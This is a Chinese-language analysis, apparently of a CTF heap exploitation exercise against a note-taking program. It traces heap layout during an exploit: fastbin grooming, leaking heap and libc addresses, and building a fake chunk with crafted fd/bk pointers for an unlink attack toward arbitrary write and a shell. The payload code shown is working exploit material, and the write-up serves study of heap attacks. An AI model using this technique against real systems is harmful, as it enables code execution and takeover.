## 内存变化总结

### 1. 初始堆状态（exp执行前）
- 堆区域：0x12c35000 - 0x12c57000
- 初始状态为干净的堆布局

### 2. exp执行过程中的内存操作

#### 阶段1：堆风水设置
```
new(1, b'a');new(1, b'a');new(1, b'a');new(1, b'a')
delete(0);delete(2)
```
- 创建4个笔记，然后删除索引0和2
- 在fastbins中创建了两个空闲chunk

#### 阶段2：信息泄露
```
new(8, b'12345678');new(8, b'12345678')
list()
```
- 重新分配两个8字节笔记，触发fastbin分配
- 通过list功能泄露堆地址和libc地址
- 计算得到：
  - 堆基址：`heap = u64(...) - 0x1940`
  - libc基址：`libcbase = u64(...) - (libc.sym['__malloc_hook'] + 0x10 + 0x58)`

#### 阶段3：堆清理
```
delete(3);delete(2);delete(1);delete(0)
```
- 删除所有笔记，清空堆状态
- 所有chunk合并回top chunk

#### 阶段4：payload构造
```
payload01 = p64(0) + p64(0x51) + p64(heap + 0x30 - 0x18) + p64(heap + 0x30 - 0x10) + b'A'*0x30 + p64(0x50) + p64(0x20)
new(len(payload01), payload01)
```

### 4. 关键内存特征

#### 利用准备状态
- **fake chunk的fd/bk指针**：精心指向笔记结构内部，为unlink攻击做准备
- **堆布局**：所有bins为空，无干扰chunk
- **内存对齐**：payload大小0x60对齐到128字节边界

#### 漏洞利用路径
当前内存状态为典型的**堆溢出unlink攻击**做准备：
1. fake chunk的fd/bk指向全局笔记结构内部
2. 后续可能通过编辑功能触发unlink操作
3. 实现任意地址写入，最终可能覆盖GOT或hook函数

这种内存布局为后续的漏洞利用（如获取shell或代码执行）奠定了坚实的基础。
